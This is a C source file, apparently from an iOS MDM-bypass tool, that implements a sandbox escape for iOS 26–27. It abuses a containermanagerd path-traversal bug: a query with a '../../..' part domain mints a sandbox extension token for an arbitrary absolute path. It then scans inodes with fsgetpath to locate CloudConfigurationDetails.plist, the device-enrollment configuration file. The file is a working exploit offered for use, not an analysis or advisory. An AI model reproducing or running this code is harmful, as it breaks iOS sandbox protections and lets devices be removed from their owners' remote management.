/*
 * bad_query_ios26.c
 *
 * Reference on-device C helper for iOS 26.0 - 27.0b4 (`containermanagerd`
 * Class-13 path traversal + `fsgetpath` inode container resolver, adapted
 * from forcequitOS/bad_query for locating and minting a sandbox token to
 * `systemgroup.com.apple.configurationprofiles` / `CloudConfigurationDetails.plist`).
 *
 * Support note: MDMPatcher-Linux is verified on iOS 9.0 - 26.x (builds 23A+).
 * iOS 27.0+ is experimental. This file is compiled only when targeting
 * Darwin/arm64e (iOS SDK); on Linux hosts, USB Lockdown (`MCInstall`) and the
 * G1 `Manifest.db` pipeline in `mdmpatcher/ios26.py` and `src/c/patch_logic.c`
 * are used.
 */

#include "bad_query_ios26.h"

#if defined(__APPLE__) && defined(__MACH__)
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/fsgetpath.h>
#include <xpc/xpc.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

int64_t ios26_acquire_systemgroup_sandbox_token(const char *absolute_path, bool create_if_missing) {
    if (!absolute_path || absolute_path[0] != '/') return -255;
    if (!create_if_missing) {
        struct stat st;
        if (lstat(absolute_path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    /* Class 13 (MCMSharedSystemDataContainer) -> containermanagerd_system */
    query_set_class(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); /* Part 3 = Library/Caches */

    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", absolute_path) == -1) {
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    query_set_flags(query, 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

void ios26_release_sandbox_token(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

char *ios26_find_configurationprofiles_container(int64_t max_inode) {
    const char *base_path = "/var/containers/Shared/SystemGroup";
    struct statfs sfs;
    if (statfs(base_path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t base_len = strlen(base_path);

    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, base_path, base_len) != 0 || p[base_len] != '/') continue;
        if (strstr(p, "CloudConfigurationDetails.plist") != NULL) {
            return strdup(p);
        }
    }
    return NULL;
}
#else
int64_t ios26_acquire_systemgroup_sandbox_token(const char *absolute_path, bool create_if_missing) {
    (void)absolute_path;
    (void)create_if_missing;
    return -1;
}

void ios26_release_sandbox_token(int64_t handle) {
    (void)handle;
}

char *ios26_find_configurationprofiles_container(int64_t max_inode) {
    (void)max_inode;
    return 0;
}
#endif
